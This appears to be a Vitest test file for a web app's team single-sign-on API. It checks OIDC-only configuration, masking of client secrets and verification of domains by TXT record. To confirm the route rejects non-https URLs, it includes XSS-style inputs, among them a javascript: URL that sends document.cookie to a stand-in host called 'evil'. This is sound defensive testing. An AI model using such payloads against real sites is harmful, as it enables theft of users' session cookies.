// @vitest-environment node
import { describe, it, expect, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

const memberFindUnique = vi.fn();
const configFindUnique = vi.fn();
const configFindFirst = vi.fn();
const configUpsert = vi.fn();
const configUpdate = vi.fn();
const hasRecord = vi.fn();

vi.mock("next-auth", () => ({
  getServerSession: vi.fn(async () => ({ user: { id: "admin-1" } })),
}));
vi.mock("@/lib/auth", () => ({ authOptions: {} }));
vi.mock("@/lib/db-users", () => ({
  prismaUsers: {
    teamMember: { findUnique: (...a: unknown[]) => memberFindUnique(...a) },
    teamSSOConfig: {
      findUnique: (...a: unknown[]) => configFindUnique(...a),
      findFirst: (...a: unknown[]) => configFindFirst(...a),
      upsert: (...a: unknown[]) => configUpsert(...a),
      update: (...a: unknown[]) => configUpdate(...a),
    },
  },
}));
vi.mock("@/lib/sso-encryption", () => ({
  encryptSSOConfig: (c: Record<string, unknown>) => c,
  decryptSSOConfig: (c: Record<string, unknown>) => c,
}));
vi.mock("@/lib/network-security", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/network-security")>()),
  validateDomainNotPrivate: vi.fn(async () => undefined),
}));
vi.mock("@/lib/sso-oidc", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/lib/sso-oidc")>()),
  domainHasVerificationRecord: (...a: unknown[]) => hasRecord(...a),
}));

const params = { params: Promise.resolve({ teamId: "team-1" }) };
const ISSUER = "https://idp.example.com";
const ENDPOINTS = {
  authorizationUrl: `${ISSUER}/authorize`,
  tokenUrl: `${ISSUER}/token`,
  userInfoUrl: `${ISSUER}/userinfo`,
};

function req(url: string, body: unknown) {
  return new NextRequest(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function save(body: Record<string, unknown>) {
  const { POST } = await import("@/app/api/teams/[teamId]/sso/route");
  return POST(req("https://lynxprompt.test/api/teams/team-1/sso", body), params);
}

async function verify(domain: string) {
  const { POST } = await import("@/app/api/teams/[teamId]/sso/verify-domain/route");
  return POST(req("https://lynxprompt.test/api/teams/team-1/sso/verify-domain", { domain }), params);
}

describe("POST /api/teams/[teamId]/sso", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.unstubAllGlobals();
    vi.clearAllMocks();
    memberFindUnique.mockResolvedValue({ role: "ADMIN" });
    configFindUnique.mockResolvedValue(null);
    configUpsert.mockImplementation(async ({ create }) => create);
  });

  it.each([
    ["issuer", { issuer: "javascript:alert(1)//" }],
    ["authorizationUrl", { authorizationUrl: "javascript:fetch('//evil/'+document.cookie)//" }],
    ["tokenUrl", { tokenUrl: "data:text/html,x" }],
  ])("rejects a non-https %s", async (_field, override) => {
    const res = await save({
      provider: "OIDC",
      enabled: true,
      issuer: ISSUER,
      clientId: "c",
      clientSecret: "s",
      ...ENDPOINTS,
      ...override,
    });

    expect(res.status).toBe(400);
    expect(configUpsert).not.toHaveBeenCalled();
  });

  it.each([
    ["SAML", { entityId: "https://idp.example.com", ssoUrl: "https://idp.example.com/sso", certificate: "x" }],
    ["LDAP", { host: "ldap.example.com", baseDn: "dc=x", bindDn: "cn=y", bindPassword: "z" }],
    ["no", { issuer: ISSUER, clientId: "c", clientSecret: "s", ...ENDPOINTS }],
  ])("accepts only OpenID Connect (%s provider refused)", async (provider, fields) => {
    const res = await save({ ...(provider === "no" ? {} : { provider }), enabled: true, ...fields });
    const body = await res.json();

    expect(res.status).toBe(400);
    expect(body.error).toBe("Only OpenID Connect (OIDC) is supported");
    expect(configUpsert).not.toHaveBeenCalled();
  });

  it("keeps the stored client secret when the edit form leaves it blank", async () => {
    configFindUnique.mockResolvedValue({
      provider: "OIDC",
      config: { issuer: ISSUER, clientId: "c", clientSecret: "stored-secret", ...ENDPOINTS },
      allowedDomains: ["acme.example"],
      verifiedDomains: ["acme.example"],
      domainVerificationToken: "tok",
    });

    const res = await save({
      provider: "OIDC",
      enabled: true,
      issuer: ISSUER,
      clientId: "c",
      ...ENDPOINTS,
      allowedDomains: ["acme.example"],
    });

    expect(res.status).toBe(200);
    const { update } = configUpsert.mock.calls[0][0];
    expect(update.config.clientSecret).toBe("stored-secret");
    expect(update.verifiedDomains).toEqual(["acme.example"]);
  });

  it("keeps the stored client secret when the masked value comes back", async () => {
    configFindUnique.mockResolvedValue({
      provider: "OIDC",
      config: { issuer: ISSUER, clientId: "c", clientSecret: "stored-secret", ...ENDPOINTS },
      allowedDomains: [],
      verifiedDomains: [],
      domainVerificationToken: "tok",
    });

    await save({ provider: "OIDC", enabled: true, issuer: ISSUER, clientId: "c", clientSecret: "••••••••", ...ENDPOINTS });

    expect(configUpsert.mock.calls[0][0].update.config.clientSecret).toBe("stored-secret");
  });

  it("asks for a client secret on a first save without one", async () => {
    const res = await save({ provider: "OIDC", enabled: true, issuer: ISSUER, clientId: "c", ...ENDPOINTS });

    expect(res.status).toBe(400);
    expect(configUpsert).not.toHaveBeenCalled();
  });

  it("stores the endpoints read from discovery and drops verification of removed domains", async () => {
    configFindUnique.mockResolvedValue({
      provider: "OIDC",
      config: {},
      allowedDomains: ["old.example", "acme.example"],
      verifiedDomains: ["old.example", "acme.example"],
      domainVerificationToken: "tok",
    });
    vi.stubGlobal(
      "fetch",
      vi.fn(async () =>
        new Response(
          JSON.stringify({
            issuer: ISSUER,
            authorization_endpoint: `${ISSUER}/oauth2/v1/authorize`,
            token_endpoint: `${ISSUER}/oauth2/v1/token`,
            userinfo_endpoint: `${ISSUER}/oauth2/v1/userinfo`,
          }),
          { status: 200 }
        )
      )
    );

    const res = await save({
      provider: "OIDC",
      enabled: true,
      issuer: ISSUER,
      clientId: "c",
      clientSecret: "s",
      allowedDomains: [" ACME.example ", "new.example"],
    });

    expect(res.status).toBe(200);
    const { update } = configUpsert.mock.calls[0][0];
    expect(update.config.tokenUrl).toBe(`${ISSUER}/oauth2/v1/token`);
    expect(update.allowedDomains).toEqual(["acme.example", "new.example"]);
    expect(update.verifiedDomains).toEqual(["acme.example"]);
    expect(update.domainVerificationToken).toBe("tok");
  });
});

describe("GET /api/teams/[teamId]/sso", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.clearAllMocks();
    memberFindUnique.mockResolvedValue({ role: "ADMIN" });
  });

  async function read() {
    const { GET } = await import("@/app/api/teams/[teamId]/sso/route");
    return GET(new NextRequest("https://lynxprompt.test/api/teams/team-1/sso"), params);
  }

  const row = (provider: string, config: Record<string, unknown>) => ({
    provider,
    enabled: true,
    config,
    allowedDomains: [],
    verifiedDomains: [],
    domainVerificationToken: "tok",
  });

  it("masks the OIDC client secret", async () => {
    configFindUnique.mockResolvedValue(row("OIDC", { issuer: ISSUER, clientId: "c", clientSecret: "s3cret" }));

    const body = await (await read()).json();

    expect(body.config).toEqual({ issuer: ISSUER, clientId: "c", clientSecret: "••••••••" });
  });

  it.each([
    ["SAML", { entityId: "https://idp.example.com", ssoUrl: "https://idp.example.com/sso", certificate: "PEM" }],
    ["LDAP", { host: "ldap.example.com", bindDn: "cn=admin", bindPassword: "plain-old-password" }],
  ])("never echoes a %s configuration saved before it was cut", async (provider, config) => {
    configFindUnique.mockResolvedValue(row(provider, config));

    const body = await (await read()).json();

    expect(body.provider).toBe(provider);
    expect(body.config).toEqual({});
  });
});

describe("POST /api/teams/[teamId]/sso/verify-domain", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.clearAllMocks();
    memberFindUnique.mockResolvedValue({ role: "ADMIN" });
    configFindUnique.mockResolvedValue({
      allowedDomains: ["acme.example"],
      verifiedDomains: [],
      domainVerificationToken: "tok",
    });
    configFindFirst.mockResolvedValue(null);
    hasRecord.mockResolvedValue(true);
  });

  it("marks the domain verified when the TXT record is there", async () => {
    const res = await verify("acme.example");

    expect(res.status).toBe(200);
    expect(hasRecord).toHaveBeenCalledWith("acme.example", "tok");
    expect(configUpdate).toHaveBeenCalledWith({
      where: { teamId: "team-1" },
      data: { verifiedDomains: { push: "acme.example" } },
    });
  });

  it("does not verify without the TXT record", async () => {
    hasRecord.mockResolvedValue(false);

    const res = await verify("acme.example");
    const body = await res.json();

    expect(res.status).toBe(400);
    expect(body.record).toEqual({ name: "_lynxprompt-sso.acme.example", value: "lynxprompt-sso=tok" });
    expect(configUpdate).not.toHaveBeenCalled();
  });

  it("refuses a domain another team already verified", async () => {
    configFindFirst.mockResolvedValue({ id: "other" });

    const res = await verify("acme.example");

    expect(res.status).toBe(409);
    expect(configUpdate).not.toHaveBeenCalled();
  });

  it("refuses a domain the team does not list", async () => {
    const res = await verify("other.example");

    expect(res.status).toBe(400);
    expect(hasRecord).not.toHaveBeenCalled();
  });

  it("refuses a member who is not an admin", async () => {
    memberFindUnique.mockResolvedValue({ role: "MEMBER" });

    const res = await verify("acme.example");

    expect(res.status).toBe(403);
    expect(configUpdate).not.toHaveBeenCalled();
  });
});
